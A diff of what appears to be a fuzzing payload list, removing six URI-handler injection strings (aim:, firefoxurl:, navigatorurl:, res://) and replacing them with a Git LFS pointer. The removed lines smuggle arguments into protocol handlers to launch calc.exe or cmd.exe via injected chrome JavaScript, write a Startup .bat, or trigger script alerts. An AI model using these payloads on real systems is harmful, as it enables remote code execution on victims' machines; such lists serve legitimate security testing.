@@ -1,6 +1,3 @@
-aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
-firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
-navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
-res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
-firefoxurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process) 
-navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process) 
+version https://git-lfs.github.com/spec/v1
+oid sha256:54dc51ebd9fe4dca9e62a5ac5753b31662f17b79beb33da19437ebd1c5efad0d
+size 1750
